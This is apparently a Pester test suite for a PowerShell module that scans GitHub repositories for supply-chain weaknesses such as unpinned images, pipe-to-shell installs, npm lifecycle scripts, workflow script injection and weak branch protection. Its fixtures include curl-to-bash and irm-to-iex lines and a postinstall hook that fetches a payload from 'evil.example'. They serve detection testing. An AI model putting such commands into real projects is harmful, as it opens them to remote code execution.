Describe 'Supply-chain gap checks' {
    BeforeAll {
        $repoRoot = Split-Path -Path $PSScriptRoot -Parent
        $modulePath = Join-Path -Path $repoRoot -ChildPath 'src/Fylgyr/Fylgyr.psm1'
        Import-Module -Name $modulePath -Force
    }

    Describe 'Test-ContainerPinning' {
        It 'fails with High severity on a floating (latest/untagged) image' {
            $wf = @([PSCustomObject]@{
                Name = 'ci.yml'
                Path = '.github/workflows/ci.yml'
                Content = @'
name: CI
on: push
jobs:
  build:
    runs-on: ubuntu-latest
    container: node:latest
    steps:
      - run: npm test
'@
            })

            $results = Test-ContainerPinning -WorkflowFiles $wf
            $results | Should -HaveCount 1
            $results[0].Status | Should -Be 'Fail'
            $results[0].Severity | Should -Be 'High'
            $results[0].AttackMapping | Should -Contain 'docker-hub-credential-breach'
        }

        It 'fails with Medium severity on a mutable-tag service image' {
            $wf = @([PSCustomObject]@{
                Name = 'ci.yml'
                Path = '.github/workflows/ci.yml'
                Content = @'
name: CI
on: push
jobs:
  build:
    runs-on: ubuntu-latest
    services:
      db:
        image: postgres:14
    steps:
      - run: npm test
'@
            })

            $results = Test-ContainerPinning -WorkflowFiles $wf
            $results[0].Status | Should -Be 'Fail'
            $results[0].Severity | Should -Be 'Medium'
            $results[0].Detail | Should -Match 'postgres:14'
        }

        It 'fails on an unpinned docker:// action reference' {
            $wf = @([PSCustomObject]@{
                Name = 'ci.yml'
                Path = '.github/workflows/ci.yml'
                Content = @'
name: CI
on: push
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: docker://alpine:3.19
'@
            })

            $results = Test-ContainerPinning -WorkflowFiles $wf
            $results[0].Status | Should -Be 'Fail'
            $results[0].Detail | Should -Match 'alpine:3\.19'
        }

        It 'passes when all images are digest-pinned' {
            $digest = 'a' * 64
            $wf = @([PSCustomObject]@{
                Name = 'ci.yml'
                Path = '.github/workflows/ci.yml'
                Content = @"
name: CI
on: push
jobs:
  build:
    runs-on: ubuntu-latest
    container: node:20@sha256:$digest
    services:
      db:
        image: postgres:14@sha256:$digest
    steps:
      - uses: docker://alpine@sha256:$digest
"@
            })

            $results = Test-ContainerPinning -WorkflowFiles $wf
            $results | Should -HaveCount 1
            $results[0].Status | Should -Be 'Pass'
        }

        It 'emits nothing for workflows without container references' {
            $wf = @([PSCustomObject]@{
                Name = 'ci.yml'
                Path = '.github/workflows/ci.yml'
                Content = @'
name: CI
on: push
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - run: echo hello
'@
            })

            $results = Test-ContainerPinning -WorkflowFiles $wf
            $results | Should -BeNullOrEmpty
        }

        It 'skips images defined by expressions it cannot resolve' {
            $wf = @([PSCustomObject]@{
                Name = 'ci.yml'
                Path = '.github/workflows/ci.yml'
                Content = @'
name: CI
on: push
jobs:
  build:
    runs-on: ubuntu-latest
    container: ${{ matrix.image }}
    steps:
      - run: echo hello
'@
            })

            $results = Test-ContainerPinning -WorkflowFiles $wf
            $results | Should -BeNullOrEmpty
        }
    }

    Describe 'Test-UntrustedDownload' {
        It 'fails on curl piped to bash' {
            $wf = @([PSCustomObject]@{
                Name = 'install.yml'
                Path = '.github/workflows/install.yml'
                Content = @'
name: Install
on: push
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - run: curl -sSL https://example.com/install.sh | bash
'@
            })

            $results = Test-UntrustedDownload -WorkflowFiles $wf
            $results | Should -HaveCount 1
            $results[0].Status | Should -Be 'Fail'
            $results[0].Severity | Should -Be 'High'
            $results[0].AttackMapping | Should -Contain 'codecov-bash-uploader'
        }

        It 'fails on PowerShell download piped to dynamic execution' {
            $wf = @([PSCustomObject]@{
                Name = 'install.yml'
                Path = '.github/workflows/install.yml'
                Content = @'
name: Install
on: push
jobs:
  build:
    runs-on: windows-latest
    steps:
      - run: irm https://example.com/install.ps1 | iex
        shell: pwsh
'@
            })

            $results = Test-UntrustedDownload -WorkflowFiles $wf
            $results[0].Status | Should -Be 'Fail'
        }

        It 'detects pipe-to-shell across a backslash line continuation' {
            $wf = @([PSCustomObject]@{
                Name = 'install.yml'
                Path = '.github/workflows/install.yml'
                Content = @'
name: Install
on: push
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - run: |
          curl -fsSL https://example.com/setup.sh \
            | sh -s -- --yes
'@
            })

            $results = Test-UntrustedDownload -WorkflowFiles $wf
            $results[0].Status | Should -Be 'Fail'
        }

        It 'does not flag curl piped to a non-interpreter like shasum' {
            $wf = @([PSCustomObject]@{
                Name = 'verify.yml'
                Path = '.github/workflows/verify.yml'
                Content = @'
name: Verify
on: push
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - run: curl -sSL https://example.com/file.tar.gz | shasum -a 256
'@
            })

            $results = Test-UntrustedDownload -WorkflowFiles $wf
            $results[0].Status | Should -Be 'Pass'
        }

        It 'ignores commented-out pipe-to-shell lines' {
            $wf = @([PSCustomObject]@{
                Name = 'clean.yml'
                Path = '.github/workflows/clean.yml'
                Content = @'
name: Clean
on: push
# legacy: curl https://example.com/old.sh | bash
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - run: echo done
'@
            })

            $results = Test-UntrustedDownload -WorkflowFiles $wf
            $results[0].Status | Should -Be 'Pass'
        }
    }

    Describe 'Test-LifecycleScript' {
        It 'warns when CI installs dependencies without --ignore-scripts' {
            Mock -ModuleName Fylgyr Invoke-GitHubApi { throw '404 Not Found' }

            $wf = @([PSCustomObject]@{
                Name = 'ci.yml'
                Path = '.github/workflows/ci.yml'
                Content = @'
name: CI
on: push
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - run: npm ci
'@
            })

            $results = Test-LifecycleScript -Owner 'org' -Repo 'repo' -Token 'fake' -WorkflowFiles $wf
            $results | Should -HaveCount 1
            $results[0].Status | Should -Be 'Warning'
            $results[0].Severity | Should -Be 'Medium'
            $results[0].AttackMapping | Should -Contain 'shai-hulud-npm-worm'
        }

        It 'passes when installs use --ignore-scripts' {
            Mock -ModuleName Fylgyr Invoke-GitHubApi { throw '404 Not Found' }

            $wf = @([PSCustomObject]@{
                Name = 'ci.yml'
                Path = '.github/workflows/ci.yml'
                Content = @'
name: CI
on: push
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - run: npm ci --ignore-scripts
'@
            })

            $results = Test-LifecycleScript -Owner 'org' -Repo 'repo' -Token 'fake' -WorkflowFiles $wf
            $results | Should -HaveCount 1
            $results[0].Status | Should -Be 'Pass'
        }

        It 'fails on a suspicious postinstall script without echoing its body' {
            $packageJson = @{
                name = 'demo'
                scripts = @{
                    postinstall = 'curl -s https://evil.example/payload.sh | bash'
                    test = 'jest'
                }
            } | ConvertTo-Json
            $encoded = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($packageJson))

            Mock -ModuleName Fylgyr Invoke-GitHubApi {
                param($Endpoint)
                if ($Endpoint -eq 'repos/org/repo/contents/package.json') {
                    return [PSCustomObject]@{ content = $encoded }
                }
                throw '404 Not Found'
            }

            $results = Test-LifecycleScript -Owner 'org' -Repo 'repo' -Token 'fake' -WorkflowFiles @()
            $results | Should -HaveCount 1
            $results[0].Status | Should -Be 'Fail'
            $results[0].Severity | Should -Be 'High'
            $results[0].Detail | Should -Match 'postinstall'
            ($results | ConvertTo-Json -Depth 5) | Should -Not -Match 'evil\.example'
        }

        It 'reports Info for benign lifecycle scripts' {
            $packageJson = @{
                name = 'demo'
                scripts = @{
                    prepare = 'husky'
                }
            } | ConvertTo-Json
            $encoded = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($packageJson))

            Mock -ModuleName Fylgyr Invoke-GitHubApi {
                param($Endpoint)
                if ($Endpoint -eq 'repos/org/repo/contents/package.json') {
                    return [PSCustomObject]@{ content = $encoded }
                }
                throw '404 Not Found'
            }

            $results = Test-LifecycleScript -Owner 'org' -Repo 'repo' -Token 'fake' -WorkflowFiles @()
            $results | Should -HaveCount 1
            $results[0].Status | Should -Be 'Info'
            $results[0].Detail | Should -Match 'prepare'
        }

        It 'passes when package.json has no install-time lifecycle scripts' {
            $packageJson = @{
                name = 'demo'
                scripts = @{ build = 'tsc'; test = 'jest' }
            } | ConvertTo-Json
            $encoded = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($packageJson))

            Mock -ModuleName Fylgyr Invoke-GitHubApi {
                param($Endpoint)
                if ($Endpoint -eq 'repos/org/repo/contents/package.json') {
                    return [PSCustomObject]@{ content = $encoded }
                }
                throw '404 Not Found'
            }

            $results = Test-LifecycleScript -Owner 'org' -Repo 'repo' -Token 'fake' -WorkflowFiles @()
            $results | Should -HaveCount 1
            $results[0].Status | Should -Be 'Pass'
        }

        It 'emits nothing when there is no package.json and no installs' {
            Mock -ModuleName Fylgyr Invoke-GitHubApi { throw '404 Not Found' }

            $results = Test-LifecycleScript -Owner 'org' -Repo 'repo' -Token 'fake' -WorkflowFiles @()
            $results | Should -BeNullOrEmpty
        }
    }

    Describe 'Test-ScriptInjection workflow inputs' {
        It 'warns when a workflow_dispatch input is interpolated in a run step' {
            $wf = @([PSCustomObject]@{
                Name = 'dispatch.yml'
                Path = '.github/workflows/dispatch.yml'
                Content = @'
name: Dispatch
on:
  workflow_dispatch:
    inputs:
      version:
        required: true
jobs:
  release:
    runs-on: ubuntu-latest
    steps:
      - run: echo "Releasing ${{ github.event.inputs.version }}"
'@
            })

            $results = Test-ScriptInjection -WorkflowFiles $wf
            $results | Should -HaveCount 1
            $results[0].Status | Should -Be 'Warning'
            $results[0].Severity | Should -Be 'High'
            $results[0].AttackMapping | Should -Contain 'github-actions-script-injection'
        }

        It 'warns when a workflow_call input is interpolated in a run step' {
            $wf = @([PSCustomObject]@{
                Name = 'reusable.yml'
                Path = '.github/workflows/reusable.yml'
                Content = @'
name: Reusable
on:
  workflow_call:
    inputs:
      target:
        type: string
jobs:
  deploy:
    runs-on: ubuntu-latest
    steps:
      - run: ./deploy.sh ${{ inputs.target }}
'@
            })

            $results = Test-ScriptInjection -WorkflowFiles $wf
            $results[0].Status | Should -Be 'Warning'
        }

        It 'flags an input routed through an env var into a run interpolation' {
            $wf = @([PSCustomObject]@{
                Name = 'indirect.yml'
                Path = '.github/workflows/indirect.yml'
                Content = @'
name: Indirect
on: workflow_dispatch
jobs:
  build:
    runs-on: ubuntu-latest
    env:
      VER: ${{ inputs.version }}
    steps:
      - run: echo "${{ env.VER }}"
'@
            })

            $results = Test-ScriptInjection -WorkflowFiles $wf
            $results[0].Status | Should -Be 'Warning'
            $results[0].Detail | Should -Match 'assigned from workflow input'
        }

        It 'emits both findings when event data and inputs are interpolated' {
            $wf = @([PSCustomObject]@{
                Name = 'both.yml'
                Path = '.github/workflows/both.yml'
                Content = @'
name: Both
on:
  workflow_dispatch:
    inputs:
      version:
        required: true
  issue_comment:
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - run: |
          echo "${{ github.event.comment.body }}"
          echo "${{ inputs.version }}"
'@
            })

            $results = Test-ScriptInjection -WorkflowFiles $wf
            $results | Should -HaveCount 2
            ($results | Where-Object Status -EQ 'Fail') | Should -HaveCount 1
            ($results | Where-Object Status -EQ 'Warning') | Should -HaveCount 1
        }

        It 'does not warn on inputs context without a dispatch or call trigger' {
            $wf = @([PSCustomObject]@{
                Name = 'push.yml'
                Path = '.github/workflows/push.yml'
                Content = @'
name: Push
on: push
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - run: echo "${{ inputs.version }}"
'@
            })

            $results = Test-ScriptInjection -WorkflowFiles $wf
            $results[0].Status | Should -Be 'Pass'
        }
    }

    Describe 'Test-BranchProtection admin bypass' {
        It 'fails when enforce_admins is disabled on classic protection' {
            Mock -ModuleName Fylgyr Invoke-GitHubApi {
                param($Endpoint)
                if ($Endpoint -match 'repos/[^/]+/[^/]+$') {
                    return [PSCustomObject]@{ default_branch = 'main' }
                }
                return [PSCustomObject]@{
                    allow_force_pushes            = [PSCustomObject]@{ enabled = $false }
                    allow_deletions               = [PSCustomObject]@{ enabled = $false }
                    enforce_admins                = [PSCustomObject]@{ enabled = $false }
                    required_pull_request_reviews = [PSCustomObject]@{
                        required_approving_review_count = 1
                        dismiss_stale_reviews           = $true
                    }
                    required_status_checks        = [PSCustomObject]@{ strict = $true; contexts = @('ci') }
                }
            }

            $results = Test-BranchProtection -Owner 'org' -Repo 'repo' -Token 'fake-token'
            $fail = @($results | Where-Object Status -EQ 'Fail')
            $fail | Should -HaveCount 1
            $fail[0].Detail | Should -Match 'administrators'
            $fail[0].AttackMapping | Should -Contain 'dropbox-github-breach'
        }

        It 'warns when a ruleset grants always-on bypass actors' {
            Mock -ModuleName Fylgyr Invoke-GitHubApi {
                param($Endpoint)
                if ($Endpoint -eq 'repos/org/repo') {
                    return [PSCustomObject]@{ default_branch = 'main' }
                }
                if ($Endpoint -eq 'repos/org/repo/branches/main/protection') {
                    throw '404 Not Found'
                }
                if ($Endpoint -eq 'repos/org/repo/rulesets') {
                    return @(
                        [PSCustomObject]@{
                            target = 'branch'
                            enforcement = 'active'
                            conditions = [PSCustomObject]@{
                                ref_name = [PSCustomObject]@{ include = @('refs/heads/main') }
                            }
                            bypass_actors = @(
                                [PSCustomObject]@{ actor_type = 'Integration'; actor_id = 1; bypass_mode = 'always' }
                            )
                            rules = @(
                                [PSCustomObject]@{ type = 'non_fast_forward' }
                                [PSCustomObject]@{ type = 'deletion' }
                                [PSCustomObject]@{
                                    type = 'pull_request'
                                    parameters = [PSCustomObject]@{
                                        required_approving_review_count = 1
                                        dismiss_stale_reviews_on_push = $true
                                    }
                                }
                                [PSCustomObject]@{ type = 'required_status_checks' }
                            )
                        }
                    )
                }
                throw 'unexpected endpoint'
            }

            $results = Test-BranchProtection -Owner 'org' -Repo 'repo' -Token 'fake-token'
            $warning = @($results | Where-Object Status -EQ 'Warning')
            $warning | Should -HaveCount 1
            $warning[0].Detail | Should -Match 'bypass actor'
        }

        It 'does not warn when bypass actors are restricted to pull requests' {
            Mock -ModuleName Fylgyr Invoke-GitHubApi {
                param($Endpoint)
                if ($Endpoint -eq 'repos/org/repo') {
                    return [PSCustomObject]@{ default_branch = 'main' }
                }
                if ($Endpoint -eq 'repos/org/repo/branches/main/protection') {
                    throw '404 Not Found'
                }
                if ($Endpoint -eq 'repos/org/repo/rulesets') {
                    return @(
                        [PSCustomObject]@{
                            target = 'branch'
                            enforcement = 'active'
                            conditions = [PSCustomObject]@{
                                ref_name = [PSCustomObject]@{ include = @('refs/heads/main') }
                            }
                            bypass_actors = @(
                                [PSCustomObject]@{ actor_type = 'Team'; actor_id = 2; bypass_mode = 'pull_request' }
                            )
                            rules = @(
                                [PSCustomObject]@{ type = 'non_fast_forward' }
                                [PSCustomObject]@{ type = 'deletion' }
                                [PSCustomObject]@{
                                    type = 'pull_request'
                                    parameters = [PSCustomObject]@{
                                        required_approving_review_count = 1
                                        dismiss_stale_reviews_on_push = $true
                                    }
                                }
                                [PSCustomObject]@{ type = 'required_status_checks' }
                            )
                        }
                    )
                }
                throw 'unexpected endpoint'
            }

            $results = Test-BranchProtection -Owner 'org' -Repo 'repo' -Token 'fake-token'
            $results | Should -HaveCount 1
            $results[0].Status | Should -Be 'Pass'
        }
    }

    Describe 'Test-SecretScanning push protection' {
        It 'warns when push protection is disabled' {
            Mock -ModuleName Fylgyr Invoke-GitHubApi {
                param($Endpoint)
                if ($Endpoint -match 'secret-scanning/alerts') {
                    return @()
                }
                return [PSCustomObject]@{
                    security_and_analysis = [PSCustomObject]@{
                        secret_scanning                 = [PSCustomObject]@{ status = 'enabled' }
                        secret_scanning_push_protection = [PSCustomObject]@{ status = 'disabled' }
                    }
                }
            }

            $results = Test-SecretScanning -Owner 'org' -Repo 'repo' -Token 'fake-token'
            $results | Should -HaveCount 2
            $warning = @($results | Where-Object Status -EQ 'Warning')
            $warning | Should -HaveCount 1
            $warning[0].Detail | Should -Match 'push protection'
            $warning[0].AttackMapping | Should -Contain 'uber-credential-leak'
        }

        It 'emits no extra finding when push protection is enabled' {
            Mock -ModuleName Fylgyr Invoke-GitHubApi {
                param($Endpoint)
                if ($Endpoint -match 'secret-scanning/alerts') {
                    return @()
                }
                return [PSCustomObject]@{
                    security_and_analysis = [PSCustomObject]@{
                        secret_scanning                 = [PSCustomObject]@{ status = 'enabled' }
                        secret_scanning_push_protection = [PSCustomObject]@{ status = 'enabled' }
                    }
                }
            }

            $results = Test-SecretScanning -Owner 'org' -Repo 'repo' -Token 'fake-token'
            $results | Should -HaveCount 1
            $results[0].Status | Should -Be 'Pass'
        }
    }
}
